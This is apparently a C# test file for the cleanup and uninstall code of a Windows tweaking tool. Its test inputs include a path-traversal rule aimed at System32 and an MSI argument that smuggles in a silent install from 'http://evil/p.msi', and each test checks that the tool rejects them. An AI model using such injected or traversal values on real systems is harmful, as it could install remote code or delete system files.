// Tests for src/Cleanup/.
using System;
using System.Collections.Generic;
using System.Linq;
using System.IO;
using System.Reflection;
using System.Text.RegularExpressions;
using ArchTweaker;

static class CleanupTests
{
    [Test] public static void Parse_DropsTraversalRule_WhenFolderContainsDotDot()
    {
        var es = Winapp.Parse("[Evil *]\nFileKey1=%AppData%\\..\\..\\Windows\\System32|*.*|RECURSE\n");
        T.True(es.All(e => e.Name != "Evil"), "traversal-only entry must be dropped (no FileKeys survive)");
    }

    [Test] public static void Parse_KeepsNormalRule_AndParsesMasksAndFlags()
    {
        var e = Winapp.Parse("[Good *]\nFileKey1=%LocalAppData%\\Good\\Cache|*.tmp;*.log|RECURSE\n").First();
        T.Eq(string.Join(";", e.FileKeys[0].Masks), "*.tmp;*.log", "masks parsed");
        T.True(e.FileKeys[0].Recurse, "RECURSE flag parsed");
    }

    [Test] public static void Parse_ReadsExcludeKey()
    {
        var e = Winapp.Parse("[Good *]\nFileKey1=%LocalAppData%\\Good|*.*\nExcludeKey1=FILE|%LocalAppData%\\Good|keep.dat\n").First();
        T.Eq(e.Excludes.Count, 1, "one ExcludeKey parsed");
    }

    [Test] public static void AllowedTarget_AllowsUnderCacheRoot_DeniesRootsAndTraversal()
    {
        // Use the Temp base: it is an allowed cache root on both Windows and Linux and (unlike AppData under
        // Mono's Linux folder layout) is never shadowed by a denied documents ancestor.
        string tmp = System.IO.Path.GetTempPath().TrimEnd(System.IO.Path.DirectorySeparatorChar);
        bool underCache = (bool)T.Call(typeof(Winapp), "AllowedTarget", System.IO.Path.Combine(tmp, "App", "Cache"));
        bool baseItself = (bool)T.Call(typeof(Winapp), "AllowedTarget", tmp);
        bool traversal = (bool)T.Call(typeof(Winapp), "AllowedTarget", System.IO.Path.Combine(tmp, "..", "x"));
        T.True(underCache, "a folder under a cache base (Temp) is allowed");
        T.False(baseItself, "the cache base root itself is denied");
        T.False(traversal, "a path containing .. is denied");
    }

    [Test] public static void UrlOk_AllowsHttpsAllowlistedHosts_Only()
    {
        T.True((bool)T.Call(typeof(Updater), "UrlOk", "https://raw.githubusercontent.com/a/b.json"), "https allowlisted host allowed");
        T.False((bool)T.Call(typeof(Updater), "UrlOk", "http://raw.githubusercontent.com/a"), "http denied");
        T.False((bool)T.Call(typeof(Updater), "UrlOk", "https://evil.example/a.json"), "non-allowlisted host denied");
    }

    [Test] public static void ParseCommand_SplitsQuotedPath()
    {
        var r = TestHelp.Parse("\"C:\\Program Files\\App\\unins.exe\" /S");
        T.Eq(r[0], "C:\\Program Files\\App\\unins.exe", "quoted file");
        T.Eq(r[1], "/S", "args after quote");
    }

    [Test] public static void ParseCommand_HandlesUnterminatedQuote_WithoutThrowing()
    {
        var r = TestHelp.Parse("\"C:\\App\\unins.exe");
        T.Eq(r[0], "C:\\App\\unins.exe", "unterminated quote takes the rest, no exception");
    }

    [Test] public static void ParseCommand_UnquotedNoSpaces_IsWholeFile()
    {
        var r = TestHelp.Parse("C:\\App\\unins.exe");
        T.Eq(r[0], "C:\\App\\unins.exe", "whole string is the file");
    }

    [Test] public static void MsiRemoveArgs_AcceptsValidGuid_RejectsGarbage()
    {
        string ok = Uninstaller.MsiRemoveArgs("MsiExec.exe /I{3F2504E0-4F89-41D3-9A0C-0305E82C3301}", true);
        T.True(ok != null && ok.Contains("/x {3F2504E0-4F89-41D3-9A0C-0305E82C3301}"), "valid GUID → quiet removal");
        T.Eq(Uninstaller.MsiRemoveArgs("MsiExec /I{x /i http://evil/p.msi /qn}", true), null, "non-GUID garbage rejected (no injection)");
    }

    [Test] public static void Leftovers_BlockSecurityProductsAndSystemFolders()
    {
        T.True(SafeLists.LeftoverBlocked(@"C:\Program Files\Kaspersky Lab\Agent"), "Kaspersky folder blocked");
        T.True(SafeLists.LeftoverBlocked(@"D:\System Volume Information"), "System Volume Information blocked on any drive");
        T.True(SafeLists.LeftoverBlocked(@"C:\Users\a\AppData\Roaming\Mozilla\Firefox"), "Firefox profile blocked");
        T.False(SafeLists.LeftoverBlocked(@"C:\Users\a\AppData\Local\SomeGame"), "ordinary app folder allowed");
        T.True(SafeLists.LeftoverBlocked(@"C:\Boot"), "drive-root Boot blocked");
        T.False(SafeLists.LeftoverBlocked(@"C:\Games\SomeApp\Boot"), "an app's own Boot subfolder allowed");
        T.False(SafeLists.LeftoverBlocked(@"C:\Program Files\Esetup"), "Esetup not mistaken for ESET");
        T.True(SafeLists.LeftoverBlocked(@"C:\Program Files\ESET"), "ESET folder blocked (no trailing slash)");
    }

    [Test] public static void Registry_BlocksProtectedBranches_AllowsOrdinaryUninstallKeys()
    {
        T.True(SafeLists.RegistryBlocked(@"SOFTWARE\Microsoft\Windows Defender\Features"), "Defender key blocked");
        T.True(SafeLists.RegistryBlocked(@"SOFTWARE\Microsoft\Office\16.0"), "Office key blocked");
        T.False(SafeLists.RegistryBlocked(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\SomeApp"), "ordinary uninstall entry allowed");
        T.False(SafeLists.RegistryBlocked(@"SOFTWARE\SomeVendor\App\Components"), "an app's own Components key allowed");
        T.True(SafeLists.RegistryBlocked(@"SOFTWARE\Microsoft\WBEM"), "WBEM key itself blocked");
    }

    [Test] public static void Clean_SkipsBrowserExtensionsAndWinSxS()
    {
        T.True(SafeLists.CleanBlocked(@"C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Extensions\abc\1.0\x.js"), "Chrome extension files skipped");
        T.True(SafeLists.CleanBlocked(@"C:\Windows\WinSxS\Temp\x"), "WinSxS skipped");
        T.False(SafeLists.CleanBlocked(@"C:\Users\a\AppData\Local\Google\Chrome\User Data\Default\Cache\f_0001"), "normal cache file cleanable");
    }

    [Test] public static void Clean_RemovesNestedFoldersAndCountsFiles()
    {
        string root = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "at-clean-" + Guid.NewGuid().ToString("N"));
        try
        {
            System.IO.Directory.CreateDirectory(System.IO.Path.Combine(root, "a", "b", "c"));
            System.IO.File.WriteAllText(System.IO.Path.Combine(root, "x.tmp"), "12345");
            System.IO.File.WriteAllText(System.IO.Path.Combine(root, "a", "b", "c", "y.tmp"), "123");
            var t = new CleanTarget { Title = "t", Dirs = () => new[] { root } };
            int sk; long freed = CleanupModule.Clean(t, out sk);
            T.True(freed == 8, "freed bytes " + freed);
            T.True(sk == 0, "nothing skipped");
            T.True(System.IO.Directory.Exists(root), "root folder kept");
            T.True(System.IO.Directory.GetFileSystemEntries(root).Length == 0, "nested folders removed");
        }
        finally { try { System.IO.Directory.Delete(root, true); } catch { } }
    }

    [Test] public static void UserTemps_IncludesTempOnce()
    {
        var l = CleanupModule.UserTemps().ToList();
        T.True(l.Count >= 1, "has a temp folder");
        T.True(l.Distinct(StringComparer.OrdinalIgnoreCase).Count() == l.Count, "no duplicates");
    }

    [Test] public static void HashMenu_DoesNotPassFileNameToPowerShell()
    {
        var t = Catalog.All.First(x => x.Id == "hashmenu");
        string d = t.Details();
        T.True(d.IndexOf("certutil", StringComparison.OrdinalIgnoreCase) >= 0 && d.IndexOf("-Command", StringComparison.OrdinalIgnoreCase) < 0, "certutil, no PowerShell -Command");
    }

    [Test] public static void Cleaner_NeverTargetsArchTweakersOwnFolder()
    {
        var mi = typeof(Winapp).GetMethod("AllowedTarget", BindingFlags.NonPublic | BindingFlags.Static);
        string root = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "ArchTweaker", "backup");
        T.False((bool)mi.Invoke(null, new object[] { root }), "ProgramData\\ArchTweaker is denied");
    }

    [Test] public static void AppIcons_MissingFilesGiveNoIcon()
    {
        T.True(AppIcons.FromIconSpec("C:\\nope\\missing.exe,3") == null, "missing exe with index");
        T.True(AppIcons.FromIconSpec("") == null, "empty");
        T.True(AppIcons.FromPackage("/no/such/folder") == null, "missing package folder");
    }

    [Test] public static void AppIcons_ReadsAPngIconFile()
    {
        string f = Path.Combine(Path.GetTempPath(), "ico-" + Guid.NewGuid().ToString("N") + ".png");
        using (var b = new System.Drawing.Bitmap(48, 48)) { using (var g = System.Drawing.Graphics.FromImage(b)) g.Clear(System.Drawing.Color.Red); b.Save(f, System.Drawing.Imaging.ImageFormat.Png); }
        try { var ic = AppIcons.FromIconSpec(f); T.True(ic != null && ic.Width == AppIcons.Size, "scaled to the list icon size"); }
        finally { try { File.Delete(f); } catch { } }
    }

    [Test] public static void Leftovers_FindPackValues_AndSkipOwnedOnes()
    {
        const string ENV = @"SYSTEM\CurrentControlSet\Control\Session Manager\Environment";
        const string GD = @"SYSTEM\CurrentControlSet\Control\GraphicsDrivers";
        try
        {
            Reg.Set(Hive.HKLM, ENV, "CPU_MAX_PENDING_INTERRUPTS", Microsoft.Win32.RegistryValueKind.String, "0");
            Reg.Set(Hive.HKLM, GD, "TdrLevel", Microsoft.Win32.RegistryValueKind.DWord, 0);
            var found = Leftovers.Scan();
            T.True(found.Any(x => !x.Harmful && x.Found.Contains("CPU_MAX_PENDING_INTERRUPTS")), "invented variable found as placebo");
            var tdr = found.FirstOrDefault(x => x.Found.Contains("TdrLevel"));
            T.True(tdr != null && tdr.Harmful, "TDR off found as harmful");
            Leftovers.Fix(found.Where(x => x.Found.Contains("TdrLevel") || x.Found.Contains("CPU_MAX_PENDING_INTERRUPTS")));
            T.True(Reg.Get(Hive.HKLM, GD, "TdrLevel") == null && Reg.Get(Hive.HKLM, ENV, "CPU_MAX_PENDING_INTERRUPTS") == null, "fixed");
        }
        finally { Reg.DeleteValue(Hive.HKLM, ENV, "CPU_MAX_PENDING_INTERRUPTS"); Reg.DeleteValue(Hive.HKLM, GD, "TdrLevel"); }
    }

    [Test] public static void V39_BinCleanup_RemovesLeftoverCopies()
    {
        string d = Path.Combine(Path.GetTempPath(), "at-bin-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(d);
        try
        {
            File.WriteAllText(Path.Combine(d, "at-1.tmp"), "x"); File.WriteAllText(Path.Combine(d, "at-2.old"), "x"); File.WriteAllText(Path.Combine(d, "ArchTweaker.exe"), "exe");
            T.Eq(Secure.CleanBin(d), 2, "two leftovers removed");
            T.True(File.Exists(Path.Combine(d, "ArchTweaker.exe")), "the program copy stays");
            File.WriteAllText(Path.Combine(d, "a"), "same"); File.WriteAllText(Path.Combine(d, "b"), "same"); File.WriteAllText(Path.Combine(d, "c"), "diff");
            T.True(Secure.SameFile(Path.Combine(d, "a"), Path.Combine(d, "b")), "same bytes");
            T.True(!Secure.SameFile(Path.Combine(d, "a"), Path.Combine(d, "c")), "different bytes");
            T.True(!Secure.SameFile(Path.Combine(d, "a"), Path.Combine(d, "missing")), "missing file");
        }
        finally { Directory.Delete(d, true); }
    }

    // 3.30
    [Test] public static void AppSettings_EditTextExactly()
    {
        T.Eq(AppSettings.SetJson("{\n  \"OPEN_ON_STARTUP\": true,\n  \"x\": 1\n}", "OPEN_ON_STARTUP", "false"), "{\n  \"OPEN_ON_STARTUP\": false,\n  \"x\": 1\n}", "replaces a value");
        T.Eq(AppSettings.SetJson("{\"x\": 1}", "y", "false"), "{\n  \"y\": false,\"x\": 1}", "adds a key");
        T.Eq(AppSettings.SetJson("{}", "y", "false"), "{\n  \"y\": false\n}", "adds to an empty object without a comma");
        T.Eq(AppSettings.SetJson("", "y", "false"), "{\n  \"y\": false\n}", "empty file");
        T.True(AppSettings.JsonIs("{\"a\": false, \"b\":true}", "a", "false"), "reads false");
        T.False(AppSettings.JsonIs("{\"a\": true}", "a", "false"), "reads true");
        T.Eq(AppSettings.SetLine("a=1\nb=2\n", "b", "3"), "a=1\nb=3\n", "replaces a line");
        T.Eq(AppSettings.SetLine("a=1\n", "c", "\"off\""), "a=1\nc=\"off\"\n", "adds before the last newline");
        T.True(AppSettings.LineIs("x=1\r\nui.hardware_acceleration=false\r\n", "ui.hardware_acceleration", "false"), "CRLF file");
        string js = AppSettings.SetBlock("user_pref(\"a\", 1);\n", "t", new[] { "user_pref(\"b\", false);" });
        T.True(AppSettings.HasBlock(js, "t"), "block written");
        T.Eq(AppSettings.SetBlock(js, "t", new[] { "user_pref(\"b\", false);" }), js, "applying twice changes nothing");
        T.Eq(AppSettings.RemoveBlock(js, "t"), "user_pref(\"a\", 1);\n", "removing the block leaves the rest");
        T.Eq(AppSettings.All.Select(s => s.Id).Distinct().Count(), AppSettings.All.Count, "unique ids");
    }

    // 3.38: the date a list's maintainer wrote into its header, in the formats the shipped lists use
    [Test] public static void HostsListDate_ReadsTheHeaderFormats()
    {
        Func<string, DateTime?> d = HostsEngine.ListDate;
        T.Eq(d("# Title: HaGeZi\n# Last modified: 16 Nov 2026 08:36 UTC\n0.0.0.0 a.com"), (DateTime?)new DateTime(2026, 11, 16), "HaGeZi");
        T.Eq(d("# Title: StevenBlack/hosts\n# Date: 15 November 2026 20:29:11 (UTC)\n0.0.0.0 a.com"), (DateTime?)new DateTime(2026, 11, 15), "StevenBlack");
        T.Eq(d("# Last updated: Sat, 17 Jun 2023 at 00:51:59 GMT\n"), (DateTime?)new DateTime(2023, 6, 17), "Dan Pollock");
        T.Eq(d("# Last modified: 08 Nov 2026 22:51 UTC+7\n"), (DateTime?)new DateTime(2026, 11, 8), "malware-filter");
        T.Eq(d("! Updated: 2026-11-08\n"), (DateTime?)new DateTime(2026, 11, 8), "ISO");
        T.Eq(d("### WindowsSpyBlocker - Hosts spy rules\n### Updated: 2022-05-16T13:25:00Z02:12\n"), (DateTime?)new DateTime(2022, 5, 16), "WindowsSpyBlocker (###)");
        T.Eq(d("0.0.0.0 a.com\n0.0.0.0 b.com\n0.0.0.0 c.com\n0.0.0.0 d.com\n# Date: 1 Jan 2020\n"), (DateTime?)null, "a date far below the header is not the list date");
        T.Eq(d("# no date here\n0.0.0.0 a.com"), (DateTime?)null, "no date");
        T.Eq(d("# Date: 31 Feb 2026\n"), (DateTime?)null, "an impossible date is ignored");
        T.Eq(d(null), (DateTime?)null, "null text");
    }

    [Test] public static void HostsListDate_StaleAfterHalfAYear()
    {
        var now = new DateTime(2026, 11, 16);
        T.False(HostsEngine.Stale(new DateTime(2026, 11, 1), now), "two weeks: fresh");
        T.True(HostsEngine.Stale(new DateTime(2023, 6, 17), now), "2023: stale");
        T.False(HostsEngine.Stale(null, now), "no date: not called stale");
    }
}
